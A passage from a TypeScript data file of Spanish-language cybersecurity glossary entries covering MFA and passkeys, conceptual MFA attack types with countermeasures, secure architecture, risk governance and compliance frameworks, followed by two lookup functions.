      "| 1 | **Conocimiento** — algo que sabes | Contraseña, PIN, respuesta a pregunta | Débil (reusable, phishable) |\n" +
      "| 2 | **Posesión** — algo que tienes | Móvil, token TOTP, llave FIDO2, smart card | Media–alta según el medio |\n" +
      "| 3 | **Inherencia** — algo que eres | Huella, rostro, iris, voz | Media (no revocable) |\n" +
      "| 4 | **Ubicación** — dónde estás | IP corporativa, geofence, red confiable | Contextual (complementaria) |\n" +
      "| 5 | **Comportamiento** — cómo actúas | Ritmo de tecleo, patrón de uso, biometría comportamental | Contextual (continua) |\n" +
      "> 💡 **MFA de verdad** = combinar factores de **categorías distintas** (ej: contraseña + passkey). Dos contraseñas o dos preguntas de seguridad **no es MFA** — es un solo factor repetido.\n" +
      "> ⚠️ Los factores 4 y 5 sostienen la **autenticación adaptativa/continua**, no reemplazan a un factor fuerte de posesión o inherencia en el login inicial.",
    examples: [
      "Contraseña (1) + passkey en el móvil (2) = MFA fuerte y phishing-resistant.",
      "PIN (1) + huella (3) al desbloquear un dispositivo con Windows Hello / Face ID.",
      "Contraseña (1) + geofence corporativo (4) → alto riesgo si el login viene de un país nuevo.",
    ],
    related: ["MFA y autenticación moderna", "AAA (Autenticación, Autorización, Accounting)", "Passkeys y FIDO2/WebAuthn", "Autenticación adaptativa / basada en riesgo"],
  },
  {
    id: 866,
    module: 83,
    term: "Passkeys y FIDO2/WebAuthn",
    short: "Autenticación con criptografía asimétrica ligada al origen: sin secreto compartido, inmune al phishing y a AiTM.",
    detail:
      "Las **passkeys** son credenciales basadas en un par de claves generado por el dispositivo del usuario:\n" +
      "• **Registro** — el dispositivo crea un par (privada + pública). La **privada nunca sale**; la pública se guarda en el servicio.\n" +
      "• **Login** — el servicio manda un *challenge*; el dispositivo lo firma con la privada; el servicio verifica con la pública.\n" +
      "• **Ligadura al origen** — la credencial está atada al dominio (`example.com`). Un dominio phishing (`examp1e.com`) no puede reutilizarla.\n" +
      "• **WebAuthn** (W3C) es la API del navegador; **FIDO2** (Alianza FIDO) el stack completo (CTAP2 + WebAuthn).\n" +
      "\n**Variantes:**\n" +
      "| Tipo | Sincronización | Recuperación | Uso |\n" +
      "|---|---|---|---|\n" +
      "| **Sync passkeys** | iCloud Keychain / Google / 1Password | Alta (backup en la nube) | Consumer |\n" +
      "| **Device-bound** | No sale del dispositivo | Baja (requiere segunda credencial) | Empresa / alto riesgo |\n" +
      "| **Attestation** | El servicio verifica el fabricante | — | Regulado (banca, gobierno) |\n" +
      "> 💡 Son la **única MFA con inmunidad demostrada** a **adversary-in-the-middle** (evilginx/Modlishka): el proxy no puede reproducir la firma porque el origen no coincide.",
    examples: [
      "Login con passkey en Google, GitHub o Apple: ni contraseña ni OTP, solo Face ID / huella.",
      "YubiKey (device-bound FIDO2) como segundo factor obligatorio para admins.",
      "Enterprise attestation: exigir passkeys emitidas por un fabricante certificado.",
    ],
    related: ["MFA y autenticación moderna", "Factores de autenticación", "Autenticación passwordless", "Ataques a MFA", "Cifrado asimétrico y par de claves"],
  },
  {
    id: 867,
    module: 83,
    term: "Autenticación passwordless",
    short: "Login sin contraseña reusable: passkeys, magic links, biometría o push verificado — más UX y menos superficie robable.",
    detail:
      "**Passwordless** significa eliminar el secreto memorizable como credencial primaria. Las vías principales:\n" +
      "• **Passkeys / FIDO2** — la referencia moderna: clave asimétrica, sin secreto compartido, phishing-resistant.\n" +
      "• **Magic links** — enlace único enviado por email; útil como fallback, débil como único método (depende del canal email).\n" +
      "• **One-tap push** con *number matching* — el servicio muestra un número; el usuario lo confirma en la app. Mitiga MFA fatigue.\n" +
      "• **Biometría local** — huella o cara desbloquean una clave local; el secreto **nunca deja el dispositivo**.\n" +
      "• **Certificados** (mTLS, smart card, PIV/CAC) — típico en entornos regulados.\n" +
      "\n> ⚠️ **Trampa común:** \"passwordless\" no es lo mismo que \"MFA fuerte\". Un magic link vía email con la cuenta comprometida es **más débil** que contraseña + passkey.\n" +
      "> 💡 El objetivo no es la ausencia de contraseña sino que **no haya un secreto reusable** que pueda ser robado, phisheado o filtrado en una brecha.\n" +
      "\n**Retos:** recuperación (¿qué pasa si perdés el dispositivo?), account bootstrap, soporte cross-device y el pasillo de **downgrade** a método más débil.",
    examples: [
      "Login en Microsoft/Google con passkey: la contraseña queda como recovery-only.",
      "Slack: magic link como primer factor + passkey como segundo.",
      "Banca online con smart card + PIN → password-less pero MFA fuerte.",
    ],
    related: ["Passkeys y FIDO2/WebAuthn", "MFA y autenticación moderna", "Factores de autenticación", "Ataques a MFA"],
  },
  {
    id: 868,
    module: 83,
    term: "Autenticación adaptativa / basada en riesgo",
    short: "El sistema evalúa contexto en cada intento y decide dinámicamente: permitir, pedir step-up o bloquear.",
    detail:
      "En vez de aplicar la **misma política** a todos los logins, la auth adaptativa **puntúa el riesgo** de cada intento y **decide**:\n" +
      "\n**Señales típicas:**\n" +
      "• **Dispositivo** — reconocido, jailbroken, versión de SO, EDR presente.\n" +
      "• **Red** — IP corporativa, VPN, país nuevo, proxy/Tor.\n" +
      "• **Comportamiento** — hora habitual, ritmo, geo velocity imposible (login en Madrid y Tokio en 10 min).\n" +
      "• **Recurso** — un dashboard interno pesa menos que la consola de admin.\n" +
      "• **Identity Threat Intel** — credenciales filtradas, cuentas expuestas en dumps.\n" +
      "\n**Decisiones posibles:**\n" +
      "| Puntaje | Acción |\n" +
      "|---|---|\n" +
      "| Bajo | Login directo (SSO transparente) |\n" +
      "| Medio | Step-up: pedir un factor adicional (MFA, passkey) |\n" +
      "| Alto | Bloquear + alertar al SOC / obligar reset |\n" +
      "\n> 💡 **Conditional Access** de Entra ID y las policies de Okta / Ping son las implementaciones enterprise más maduras. Se combinan con **continuous authentication** (biometría comportamental durante la sesión).\n" +
      "> ⚠️ Cuidado: reglas mal calibradas generan **fricción excesiva** (usuarios evaden con VPN personal) o **falsa sensación** (permitir por IP corporativa cuando el atacante ya está adentro).",
    examples: [
      "Entra Conditional Access: si el usuario está fuera de la red corporativa Y accede al portal financiero → exigir passkey.",
      "Okta Risk Engine bloquea un login que viene de un país nuevo con un browser sin cookies.",
      "Session risk sube durante la sesión (comportamiento anómalo) → forzar re-login.",
    ],
    related: ["MFA y autenticación moderna", "Factores de autenticación", "Ciclo de vida de la identidad", "Ataques a MFA"],
  },
  {
    id: 869,
    module: 83,
    term: "Ataques a MFA",
    short: "Cómo se rompe MFA en el mundo real: fatiga, SIM swap, proxy phishing (AiTM), consent phishing e interceptación de push.",
    detail:
      "La MFA no es infalible. Los vectores más frecuentes:\n" +
      "\n**1. MFA fatigue / prompt bombing** — el atacante ya tiene la contraseña (dump o phishing) y **bombardea con pushes**. Un empleado cansado acepta uno. → **Uber (2022)** y **Cisco (2022)** cayeron por acá.\n" +
      "\n**2. SIM swapping** — el atacante convence al carrier de portar el número a su SIM y recibe los **SMS OTP**. Ataque clásico contra cripto y banca.\n" +
      "\n**3. Adversary-in-the-middle (AiTM) / proxy phishing** — herramientas como **evilginx** o **Modlishka** proxean el sitio real, capturan credenciales **y el token de sesión post-MFA**. TOTP y push SMS caen; **FIDO2/passkeys no** (origin binding).\n" +
      "\n**4. Consent phishing (illicit consent grant)** — no roba credenciales: engaña al usuario para que **conceda permisos OAuth** a una app maliciosa. Salta MFA porque no la necesita; obtiene tokens persistentes.\n" +
      "\n**5. Push interception / token replay** — apps mal implementadas, deeplinks abusables o malware en el móvil que aprueba el push sin interacción.\n" +
      "\n**Contramedidas:**\n" +
      "• **Number matching** en push (Microsoft, Google) — el usuario tipea un número mostrado en la pantalla.\n" +
      "• **FIDO2 / passkeys** obligatorias para admins y accesos privilegiados.\n" +
      "• **Bloqueo de SMS OTP** para cuentas de alto valor; migrar a app authenticator o passkey.\n" +
      "• **Consent governance** — revisar apps con permisos peligrosos, alertas por consentimientos nuevos.\n" +
      "• **Verified push** — atado a dispositivo confiable + señal de riesgo del contexto.\n" +
      "> 💡 La lección de Uber/Cisco: MFA débil + un solo usuario cansado = compromiso. FIDO2 corta esa cadena.",
    examples: [
      "Uber 2022: contractor pusheado hasta que aceptó → tokens robados → acceso a Slack, HackerOne, etc.",
      "Reddit 2023: empleados cayeron en AiTM phishing; passkeys mitigan.",
      "Cripto: SIM swap masivo en 2020–2022 vaciando cuentas con solo SMS 2FA.",
    ],
    related: ["MFA y autenticación moderna", "Passkeys y FIDO2/WebAuthn", "Factores de autenticación", "Ingeniería social", "Defensas anti-phishing"],
  },

  // ── M84 · Arquitectura de Seguridad y Patrones de Diseño ─────────────────
  {
    id: 870,
    module: 84,
    term: "Principios de diseño seguro",
    short: "Las máximas que guían toda arquitectura: defensa en profundidad, fail-safe, menor privilegio.",
    detail:
      "Los principios clásicos (Saltzer & Schroeder + acumulado moderno) son la brújula:\n" +
      "• **Defensa en profundidad** — capas; ningún control único debe ser fatal.\n" +
      "• **Fail-safe defaults** — denegar por defecto; abrir explícito.\n" +
      "• **Menor privilegio** — solo lo necesario, el menor tiempo posible.\n" +
      "• **Separación de responsabilidades** — ninguna acción crítica en manos de uno solo.\n" +
      "• **Mecanismo económico** — simple es más auditable que clever.\n" +
      "> 💡 Lo no listado: no inventar tu propia cripto y minimizar superficie.",
    examples: [
      "Permisos en una API: deny by default y allow explícito.",
      "Separar quien aprueba un pago de quien lo ejecuta.",
    ],
    related: ["Defensa en profundidad", "Patrones de diseño seguro", "Zero Trust Architecture"],
  },
  {
    id: 871,
    module: 84,
    term: "Patrones de diseño seguro",
    short: "Soluciones reutilizables: gatekeeper, broker, reverse proxy, BFF, valet key.",
    detail:
      "Patrones recurrentes:\n" +
      "• **Gatekeeper / API Gateway** — punto único que valida, autentica y enruta.\n" +
      "• **Broker** — desacopla cliente y backend; permite cambiar la implementación.\n" +
      "• **Reverse proxy + WAF** — protege la app y centraliza TLS/headers.\n" +
      "• **BFF (Backend For Frontend)** — un backend por canal, evita exponer toda la API al móvil/web.\n" +
      "• **Valet key** — token de un solo uso para acceso temporal a un recurso.\n" +
      "> 💡 La intención: aislar la complejidad y poner el control en lugares **chequeables**.",
    examples: [
      "Un BFF para la app móvil que filtra qué expone del backend.",
      "API Gateway con throttling, auth y observabilidad centralizadas.",
    ],
    related: ["Principios de diseño seguro", "Zero Trust Architecture", "Headers de seguridad"],
  },
  {
    id: 872,
    module: 84,
    term: "Zero Trust Architecture",
    short: "Nunca confiar, siempre verificar: cada acceso evalúa identidad, dispositivo y contexto.",
    detail:
      "El modelo clásico (perímetro confiable, dentro libre) ya no funciona. **Zero Trust** (NIST SP 800-207) parte de **'asumir brecha'** y exige verificación **en cada acceso**: quién (identidad fuerte), desde dónde (dispositivo conforme), a qué (recurso concreto), bajo qué condiciones (contexto, riesgo). No hay 'dentro' implícito.\n" +
      "> 💡 Pasar a Zero Trust no es un producto: es un **viaje** que va eliminando la confianza implícita pieza por pieza. Ver el diagrama 'Pilares de Zero Trust'.",
    examples: [
      "Acceso a una app condicionado a postura del dispositivo + MFA.",
      "Eliminar VPN clásica a favor de un broker ZTNA.",
    ],
    related: ["Principio de mínimo privilegio", "Microsegmentación", "Principios de diseño seguro"],
  },
  {
    id: 873,
    module: 84,
    term: "Microsegmentación",
    short: "Segmentar más allá de la red plana: cada workload en su microperímetro con políticas explícitas.",
    detail:
      "La **microsegmentación** lleva la idea de DMZ a su límite: cada **workload** (VM, contenedor, pod) opera en un **microperímetro** con reglas explícitas de quién puede hablar con quién. Limita drásticamente el **movimiento lateral**: comprometer una pieza no abre la puerta al resto.\n" +
      "> 💡 Es la materialización de Zero Trust a nivel de red — políticas declarativas que viajan con la carga.",
    examples: [
      "NetworkPolicies de Kubernetes aislando el frontend del backend.",
      "Segmentación east-west en data center con políticas L7.",
    ],
    related: ["Zero Trust Architecture", "DMZ y segmentación de red", "Defensa contra el movimiento lateral"],
  },
  {
    id: 874,
    module: 84,
    term: "Marcos de arquitectura (SABSA, NIST, TOGAF)",
    short: "Marcos que estructuran el diseño: del 'por qué' del negocio al 'cómo' técnico.",
    detail:
      "Para que la arquitectura sea coherente y trazable, se apoyan en marcos:\n" +
      "| Marco | Enfoque |\n" +
      "|---|---|\n" +
      "| SABSA | Capas desde 'contextual' (negocio) a 'componente' (técnica) |\n" +
      "| NIST CSF | Funciones (Govern, Identify, Protect, Detect, Respond, Recover) |\n" +
      "| TOGAF | Arquitectura empresarial general |\n" +
      "> 💡 SABSA es de los más usados para diseñar seguridad **alineada al negocio**.",
    examples: [
      "Mapear capacidades del negocio a controles con NIST CSF.",
      "Diseñar con SABSA garantizando trazabilidad del 'por qué' al 'cómo'.",
    ],
    related: ["Principios de diseño seguro", "NIST Cybersecurity Framework (CSF)", "Gobernanza de seguridad"],
  },

  // ── M85 · Gobernanza y Gestión de Riesgos ────────────────────────────────
  {
    id: 880,
    module: 85,
    term: "Gobernanza de seguridad",
    short: "Quién decide qué, con qué autoridad: el marco que alinea seguridad con la dirección.",
    detail:
      "La **gobernanza** establece **quién manda en qué** (CISO, comités, RACI), define el **apetito y la tolerancia al riesgo**, aprueba políticas y revisa métricas. Es lo que separa una función de seguridad **estratégica** (con voz en la dirección) de una **reactiva** (apagar fuegos).\n" +
      "> 💡 Apetito de riesgo: cuánto riesgo está dispuesta a aceptar la organización para perseguir objetivos. Sin él, todo decision es ad hoc.",
    examples: [
      "Un comité de riesgo de TI que aprueba la matriz anual.",
      "Una política aprobada por el CEO que el CISO ejecuta.",
    ],
    related: ["Gestión de riesgos"],
  },
  {
    id: 881,
    module: 85,
    term: "Identificación y análisis de riesgos",
    short: "Listar lo que puede salir mal y medir cuánto importa — cualitativo o cuantitativo.",
    detail:
      "Identificar riesgos cataloga **amenazas × vulnerabilidades × activos**. El análisis los **valora**:\n" +
      "• **Cualitativo** — matriz probabilidad × impacto (Alto/Medio/Bajo).\n" +
      "• **Cuantitativo** — **ALE** = SLE × ARO (pérdida anual esperada).\n" +
      "• **FAIR** — combina ambos con factores explícitos.\n" +
      "> 💡 Para PyMEs y comunicación con dirección: cualitativo. Para decisiones de gran inversión: cuantitativo.",
    examples: [
      "Matriz 5x5 de riesgos del trimestre.",
      "Calcular el ALE de un escenario de ransomware.",
    ],
    related: ["Amenaza, Vulnerabilidad y Riesgo", "Tratamiento del riesgo", "Gobernanza de seguridad"],
  },
  {
    id: 882,
    module: 85,
    term: "Tratamiento del riesgo",
    short: "Para cada riesgo: mitigar, transferir, aceptar o evitar — y registrar la decisión.",
    detail:
      "Tras valorar, hay **cuatro estrategias**:\n" +
      "| Estrategia | Cuándo |\n" +
      "|---|---|\n" +
      "| Mitigar | Reducir con controles |\n" +
      "| Transferir | Seguro, outsourcing |\n" +
      "| Aceptar | El control cuesta más que el daño |\n" +
      "| Evitar | Eliminar la actividad que lo genera |\n" +
      "Toda decisión queda en el **registro de riesgos**, firmada por el **risk owner**.\n" +
      "> 💡 Aceptar un riesgo NO es ignorarlo: es decidirlo conscientemente, con responsable y revisión.",
    examples: [
      "Aceptar un riesgo bajo en un sistema que se retira en 6 meses.",
      "Transferir el riesgo de fraude con un ciberseguro.",
    ],
    related: ["Identificación y análisis de riesgos", "Gestión de riesgos", "Metodologías de riesgo"],
  },
  {
    id: 883,
    module: 85,
    term: "Metodologías de riesgo",
    short: "ISO 27005, NIST RMF y MAGERIT: los marcos estándar para hacerlo de forma defendible.",
    detail:
      "Marcos consolidados:\n" +
      "• **ISO/IEC 27005** — gestión de riesgos en el contexto de un SGSI (ISO 27001).\n" +
      "• **NIST RMF / SP 800-37** — el marco federal de EE.UU., con foco en ciclo completo.\n" +
      "• **MAGERIT** — referente en sector público español.\n" +
      "• **OCTAVE / FAIR** — alternativas más cualitativas/cuantitativas.\n" +
      "Todos comparten el ciclo: **contexto → identificar → analizar → evaluar → tratar → monitorear**. Ver el diagrama 'Ciclo de gestión de riesgos'.",
    examples: [
      "Usar ISO 27005 como base del proceso de la empresa.",
      "MAGERIT para una administración pública española.",
    ],
    related: ["Tratamiento del riesgo", "ISO/IEC 27001", "NIST Cybersecurity Framework (CSF)"],
  },

  // ── M86 · Cumplimiento Normativo y Auditoría ─────────────────────────────
  {
    id: 890,
    module: 86,
    term: "Marcos regulatorios clave",
    short: "RGPD, HIPAA, PCI-DSS, SOC 2: qué proteger según sector y geografía.",
    detail:
      "Los marcos más extendidos:\n" +
      "| Marco | Foco |\n" +
      "|---|---|\n" +
      "| RGPD / GDPR | Datos personales (UE) |\n" +
      "| HIPAA | Datos sanitarios (EE.UU.) |\n" +
      "| PCI-DSS | Pagos con tarjeta |\n" +
      "| SOC 2 | Servicios SaaS (confianza) |\n" +
      "| NIS2 / DORA | Infraestructura crítica / finanzas (UE) |\n" +
      "> ⚠️ El **RGPD** llega hasta sanciones del **4% de la facturación global** — es alineación de incentivos, no un papel.",
    examples: [
      "Un SaaS B2B obteniendo el informe SOC 2 Type II.",
      "Un comercio cumpliendo PCI-DSS para procesar tarjetas.",
    ],
    related: ["ISO/IEC 27001", "Proceso de auditoría"],
  },
  {
    id: 891,
    module: 86,
    term: "ISO 27001, SGSI y SoA",
    short: "El SGSI es el sistema vivo; la SoA dice qué controles aplican y por qué.",
    detail:
      "**ISO/IEC 27001** define un **SGSI** basado en el ciclo **PDCA** (Plan-Do-Check-Act) y la gestión de riesgos. Su **Anexo A** lista controles de referencia (revisión 2022: 93 controles en 4 dominios). La **Declaración de Aplicabilidad (SoA)** justifica **cuáles aplican** y cuáles no, **y por qué** — es el documento estrella de la auditoría.\n" +
      "> 💡 Certificarse no es 'tenerlo todo'; es demostrar un sistema **vivo** y trazable. La SoA es la pieza más mirada por el auditor externo.",
    examples: [
      "PDCA: revisar el SGSI tras cada incidente relevante.",
      "Documentar en la SoA por qué se excluye un control concreto.",
    ],
    related: ["Marcos regulatorios clave", "Proceso de auditoría", "ISO/IEC 27001"],
  },
  {
    id: 892,
    module: 86,
    term: "Proceso de auditoría",
    short: "Planificación → trabajo de campo → reporte → seguimiento; con evidencia objetiva en cada paso.",
    detail:
      "Una auditoría sigue cuatro fases:\n" +
      "1. **Planificación** — alcance, criterios, equipo, plan de muestreo.\n" +
      "2. **Trabajo de campo** — entrevistas, revisión de evidencias, pruebas.\n" +
      "3. **Reporte** — hallazgos clasificados (mayor / menor / observación / oportunidad).\n" +
      "4. **Seguimiento** — verificar el cierre de las acciones correctivas.\n" +
      "> 💡 Auditoría **interna** (mejora) y **externa** (certificación) tienen lógicas distintas pero el mismo método: **evidencia objetiva**.",
    examples: [
      "Plan de muestreo de logs y registros del trimestre.",
      "Acta de cierre tras verificar las no conformidades.",
    ],
    related: ["ISO 27001, SGSI y SoA", "Marcos regulatorios clave", "Políticas y no conformidades"],
  },
  {
    id: 893,
    module: 86,
    term: "Políticas y no conformidades",
    short: "Las políticas marcan el 'qué'; las no conformidades son brechas entre lo escrito y lo hecho.",
    detail:
      "La **jerarquía documental** clásica:\n" +
      "• **Política** — qué y por qué (firmada por dirección).\n" +
      "• **Norma** — qué nivel de cumplimiento exigir.\n" +
      "• **Procedimiento** — cómo hacerlo.\n" +
      "• **Registro/Evidencia** — prueba de que se hizo.\n" +
      "Una **no conformidad** es la **brecha** entre lo escrito y lo ejecutado. Se clasifica (mayor/menor), se trata con un **plan de acciones correctivas** y se sigue hasta el cierre.\n" +
      "> ⚠️ Una política sin evidencia es papel mojado en una auditoría.",
    examples: [
      "Política de contraseñas + procedimiento + logs de cumplimiento.",
      "No conformidad: la política exige MFA y un sistema crítico no lo tiene.",
    ],
    related: ["Proceso de auditoría", "ISO 27001, SGSI y SoA", "Gobernanza de seguridad"],
  },
];

export function definitionsByModule(moduleId: number): ConceptDefinition[] {
  return DEFINITIONS.filter((d) => d.module === moduleId);
}

export function getDefinition(id: number): ConceptDefinition | undefined {
  return DEFINITIONS.find((d) => d.id === id);
}
